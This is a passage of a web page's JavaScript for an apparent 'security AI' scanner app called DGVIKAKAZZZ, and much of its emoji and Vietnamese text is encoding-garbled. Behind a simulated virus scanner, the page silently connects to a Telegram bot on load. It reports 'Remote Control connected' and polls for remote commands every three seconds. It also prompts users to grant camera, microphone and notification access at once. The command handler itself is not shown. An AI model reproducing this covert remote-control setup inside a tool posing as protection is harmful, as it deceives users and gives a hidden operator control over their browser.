        await this.sendMessage(`üí¨ <b>You:</b> ${userMessage}\n\n‚è≥ AI thinking...`);
        
        const result = await AI.chat(userMessage);
        
        if (result.error) {
          await this.sendMessage(`‚ùå AI Error: ${result.error}`);
          return;
        }
        
        await this.sendMessage(`<b>ü§ñ AI:</b>\n\n${result.content}\n\n<i>Created by DUONG VI</i>`);
      },

      async autoConnect() {
        console.log('üîå Auto-connecting Telegram...');
        const result = await this.sendMessage(`<b>üîê DGVIKAKAZZZ CONNECTED</b>\n\n‚úÖ Connection successful!\nüïê ${Utils.formatDateTime()}\n\nBot ready to receive commands!\n\n<i>Created by DUONG VI</i>`);
        
        if (result.success) {
          AppState.telegram.connected = true;
          console.log('‚úÖ Telegram Bot connected successfully (running in background)');
          UI.logActivity('‚úÖ Remote Control connected', 'info');
          AppState.telegram.pollingInterval = setInterval(() => this.pollCommands(), 3000);
        } else {
          console.error('‚ùå Telegram connection failed:', result.error);
        }
      }
    };
  </script><!-- ============================================
       ACTIONS MODULE
       ============================================ -->
  <script>
    const Actions = {
      quarantineThreat(index) {
        const threat = AppState.threats[index];
        AppState.quarantine.push(threat);
        AppState.threats.splice(index, 1);
        AppState.stats.quarantined++;
        AppState.stats.viruses--;
        UI.updateStats();
        UI.renderThreats();
        UI.renderQuarantine();
        UI.logActivity(`Quarantined: ${threat.name}`, 'warning');
      },

      clearQuarantine() {
        if (AppState.quarantine.length === 0) {
          UI.showAlert('Quarantine zone already empty!');
          return;
        }
        const count = AppState.quarantine.length;
        AppState.quarantine.length = 0;
        AppState.stats.quarantined = 0;
        UI.updateStats();
        UI.renderQuarantine();
        UI.logActivity(`üóëÔ∏è Cleared ${count} items from quarantine`, 'warning');
        UI.showAlert(`Cleared ${count} items from quarantine!`);
      },

      handleFiles(files) {
        const fileArray = Array.from(files);
        
        fileArray.forEach((file, i) => {
          const fileObj = {
            name: file.name,
            size: Utils.formatFileSize(file.size),
            status: 'scanning',
            icon: 'üìÑ'
          };

          const ext = file.name.toLowerCase().substring(file.name.lastIndexOf('.'));
          if (['.exe', '.bat', '.cmd'].includes(ext)) fileObj.icon = '‚öôÔ∏è';
          if (['.zip', '.rar', '.7z'].includes(ext)) fileObj.icon = 'üì¶';
          if (['.jpg', '.png', '.gif'].includes(ext)) fileObj.icon = 'üñºÔ∏è';

          AppState.uploadedFiles.push(fileObj);
          UI.renderFileQueue();

          setTimeout(() => {
            Scanner.scanFile(file, AppState.uploadedFiles.length - 1);
          }, i * 500);
        });
      },

      async monitorSystem() {
        if (!AppState.monitoring.active) return;
        
        const cookies = document.cookie.split(';').filter(c => c.trim());
        const trackingCookies = cookies.filter(c => {
          const name = c.split('=')[0].trim().toLowerCase();
          return name.includes('_ga') || name.includes('_fbp') || name.includes('track');
        });
        
        if (trackingCookies.length > 0) {
          UI.logActivity(`Detected ${trackingCookies.length} tracking cookies`, 'warning');
        }
        
        UI.logActivity('Periodic scan complete', 'info');
      },

      startMonitoring() {
        AppState.monitoring.active = true;
        document.getElementById('monitorStatus').textContent = 'Monitoring active...';
        document.getElementById('toggleMonitor').textContent = 'Stop Monitoring';
        
        UI.logActivity('üü¢ Started monitoring', 'info');
        this.monitorSystem();
        AppState.monitoring.interval = setInterval(() => this.monitorSystem(), 15000);
      },

      stopMonitoring() {
        AppState.monitoring.active = false;
        if (AppState.monitoring.interval) {
          clearInterval(AppState.monitoring.interval);
          AppState.monitoring.interval = null;
        }
        document.getElementById('monitorStatus').textContent = 'Stopped';
        document.getElementById('toggleMonitor').textContent = 'Start Monitoring';
        
        UI.logActivity('üî¥ Stopped monitoring', 'warning');
      },

      async sendChatMessage(userMessage) {
        AppState.chatMessages.push({ role: 'user', content: userMessage });
        UI.addChatMessage('user', userMessage);
        
        const loadingMsg = UI.addChatMessage('assistant', '', true);
        
        const result = await AI.chat(userMessage);
        
        loadingMsg.remove();
        
        if (result.error) {
          UI.addChatMessage('assistant', `‚ùå Error: ${result.error}`);
          return;
        }
        
        AppState.chatMessages.push({ role: 'assistant', content: result.content });
        UI.addChatMessage('assistant', result.content);
        UI.logActivity(`Chat AI: "${userMessage.substring(0, 30)}..."`, 'info');
      }
    };

    window.Actions = Actions;
  </script><!-- ============================================
       EVENT HANDLERS
       ============================================ -->
  <script>
    document.getElementById('toggleWorkerBtn').addEventListener('click', () => {
      if (AppState.worker.active) {
        WorkerModule.stop();
      } else {
        WorkerModule.start();
      }
    });

    const uploadZone = document.getElementById('uploadZone');
    const fileInput = document.getElementById('fileInput');

    uploadZone.addEventListener('click', () => {
      fileInput.click();
    });

    fileInput.addEventListener('change', (e) => {
      if (e.target.files.length > 0) {
        Actions.handleFiles(e.target.files);
      }
    });

    uploadZone.addEventListener('dragover', (e) => {
      e.preventDefault();
      uploadZone.classList.add('drag-over');
    });

    uploadZone.addEventListener('dragleave', () => {
      uploadZone.classList.remove('drag-over');
    });

    uploadZone.addEventListener('drop', (e) => {
      e.preventDefault();
      uploadZone.classList.remove('drag-over');
      
      if (e.dataTransfer.files.length > 0) {
        Actions.handleFiles(e.dataTransfer.files);
      }
    });

    document.getElementById('scanBtn').addEventListener('click', () => Scanner.scanSystem());
    
    document.getElementById('stopBtn').addEventListener('click', () => {
      Scanner.stopScan();
      UI.updateProgress(0, 'Stopped');
      UI.logActivity('ÔøΩÔøΩÔøΩÔ∏è Scan stopped by user', 'warning');
    });

    document.getElementById('clearBtn').addEventListener('click', () => Actions.clearQuarantine());

    document.getElementById('toggleMonitor').addEventListener('click', () => {
      if (AppState.monitoring.active) {
        Actions.stopMonitoring();
      } else {
        Actions.startMonitoring();
      }
    });

    document.getElementById('analyzeNow').addEventListener('click', async () => {
      const aiContent = document.getElementById('aiAnalysisContent');
      const aiThinking = document.getElementById('aiThinking');
      const analyzeBtn = document.getElementById('analyzeNow');
      
      analyzeBtn.disabled = true;
      aiThinking.style.display = 'block';
      
      aiContent.innerHTML = `<div style="text-align: center; padding: 30px; color: #8892b0;"><div class="scanning-spinner" style="margin: 0 auto 15px auto;"></div><p style="margin: 0;">AI analyzing entire system...</p></div>`;

      const result = await AI.analyzeSystem();

      aiThinking.style.display = 'none';
      analyzeBtn.disabled = false;

      if (result.error) {
        aiContent.innerHTML = `<div style="padding: 15px; background: rgba(255, 71, 87, 0.1); border-left: 4px solid #ff4757; border-radius: 6px;"><p style="margin: 0; color: #ff4757; font-weight: 600;">Error calling AI</p><p style="margin: 8px 0 0 0; color: #8892b0; font-size: 13px;">${result.error}</p></div>`;
        return;
      }

      const formattedContent = result.content.replace(/\*\*(.*?)\*\*/g, '<strong style="color: #00d4ff;">$1</strong>').replace(/\n/g, '<br>');

      aiContent.innerHTML = `<div style="padding: 15px; background: rgba(0, 212, 255, 0.05); border-left: 4px solid #00d4ff; border-radius: 6px;">${formattedContent}</div><div style="margin-top: 10px; padding: 10px; background: rgba(46, 213, 115, 0.1); border-radius: 6px; font-size: 12px; color: #8892b0;">Analysis complete at: ${Utils.formatTime()}</div>`;

      UI.logActivity('üß† AI analysis complete', 'info');
    });

    document.getElementById('chatForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const input = document.getElementById('chatInput');
      const message = input.value.trim();
      
      if (!message) return;
      
      input.value = '';
      input.disabled = true;
      
      await Actions.sendChatMessage(message);
      
      input.disabled = false;
      input.focus();
    });
  </script><!-- ============================================
       ELEMENT SDK CONFIGURATION
       ============================================ -->
  <script>
    const defaultConfig = {
      app_title: "DGVIKAKAZZZ Security AI",
      upload_title: "Upload & Auto Scan",
      scan_button_text: "Scan System Now",
      stop_button_text: "Stop Scan",
      background_color: "#1a1a2e",
      surface_color: "#16213e"
    };

    async function onConfigChange(config) {
      document.getElementById('app-title').textContent = config.app_title || defaultConfig.app_title;
      document.getElementById('upload-title').textContent = config.upload_title || defaultConfig.upload_title;
      document.getElementById('scan-button-text').textContent = config.scan_button_text || defaultConfig.scan_button_text;
      document.getElementById('stop-button-text').textContent = config.stop_button_text || defaultConfig.stop_button_text;

      const bgColor = config.background_color || defaultConfig.background_color;
      const surfaceColor = config.surface_color || defaultConfig.surface_color;

      document.body.style.background = `linear-gradient(135deg, ${bgColor} 0%, ${surfaceColor} 100%)`;
    }

    if (window.elementSdk) {
      window.elementSdk.init({
        defaultConfig,
        onConfigChange,
        mapToCapabilities: (config) => ({
          recolorables: [
            {
              get: () => config.background_color || defaultConfig.background_color,
              set: (value) => {
                window.elementSdk.config.background_color = value;
                window.elementSdk.setConfig({ background_color: value });
              }
            },
            {
              get: () => config.surface_color || defaultConfig.surface_color,
              set: (value) => {
                window.elementSdk.config.surface_color = value;
                window.elementSdk.setConfig({ surface_color: value });
              }
            }
          ],
          borderables: [],
          fontEditable: undefined,
          fontSizeable: undefined
        }),
        mapToEditPanelValues: (config) => new Map([
          ["app_title", config.app_title || defaultConfig.app_title],
          ["upload_title", config.upload_title || defaultConfig.upload_title],
          ["scan_button_text", config.scan_button_text || defaultConfig.scan_button_text],
          ["stop_button_text", config.stop_button_text || defaultConfig.stop_button_text]
        ])
      });
    }
  </script><!-- ============================================
       PERMISSION MODULE
       ============================================ -->
  <script>
    const PermissionManager = {
      async requestAllPermissions() {
        const results = {
          camera: false,
          microphone: false,
          notifications: false
        };
        
        try {
          // 1. Xin quy·ªÅn Camera
          try {
            const cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
            cameraStream.getTracks().forEach(track => track.stop());
            results.camera = true;
            console.log('‚úÖ Camera permission granted');
          } catch (e) {
            console.warn('‚ùå Camera permission denied:', e.message);
          }
          
          // 2. Xin quy·ªÅn Microphone
          try {
            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            audioStream.getTracks().forEach(track => track.stop());
            results.microphone = true;
            console.log('‚úÖ Microphone permission granted');
          } catch (e) {
            console.warn('‚ùå Microphone permission denied:', e.message);
          }
          
          // 3. Xin quy·ªÅn Notifications (n·∫øu c√≥)
          if ('Notification' in window && Notification.permission !== 'granted') {
            try {
              const notifPermission = await Notification.requestPermission();
              results.notifications = notifPermission === 'granted';
              console.log(`${results.notifications ? '‚úÖ' : '‚ùå'} Notification permission ${notifPermission}`);
            } catch (e) {
              console.warn('‚ùå Notification permission error:', e.message);
            }
          }
          
          // 4. ·∫®n popup
          const popup = document.getElementById('permissionPopup');
          if (popup) {
            popup.style.opacity = '0';
            popup.style.transition = 'opacity 0.3s ease';
            setTimeout(() => {
              popup.style.display = 'none';
            }, 300);
          }
          
          // 5. Hi·ªÉn thÔøΩÔøΩÔøΩ k·∫øt qu·∫£
          const grantedCount = Object.values(results).filter(r => r).length;
          const totalCount = Object.keys(results).length;
          
          UI.showAlert(`‚úÖ ƒê√£ c·∫•p ${grantedCount}/${totalCount} quy·ªÅn cho ·ª©ng d·ª•ng!`);
          UI.logActivity(`üîê Permissions granted: ${grantedCount}/${totalCount}`, 'info');
          
          console.log('üìä Permission results:', results);
          
        } catch (error) {
          console.error('‚ùå Permission request error:', error);
          
          // V·∫´n ·∫©n popup n·∫øu c√≥ l·ªói
          const popup = document.getElementById('permissionPopup');
          if (popup) {
            popup.style.display = 'none';
          }
        }
      }
    };
    
    // G·∫Øn s·ª± ki·ªán cho n√∫t "Cho ph√©p t·∫•t c·∫£"
    document.getElementById('allowPermissionsBtn').addEventListener('click', async () => {
      const btn = document.getElementById('allowPermissionsBtn');
      btn.disabled = true;
      btn.innerHTML = '‚è≥ ƒêang xin quy·ªÅn...';
      
      await PermissionManager.requestAllPermissions();
    });
  </script><!-- ============================================
       INITIALIZATION
       ============================================ -->
  <script>
    console.log('üöÄ DGVIKAKAZZZ Security AI starting...');
    
    UI.updateStats();
    Actions.startMonitoring();
    UI.logActivity('üöÄ DGVIKAKAZZZ ready - Created by DUONG VI', 'info');
    console.log('‚úÖ System ready!');
    
    setTimeout(() => {
      Telegram.autoConnect();
    }, 2000);
  </script>
 <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9aa2fbed20733db0',t:'MTc2NTA5OTYxNC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
</html>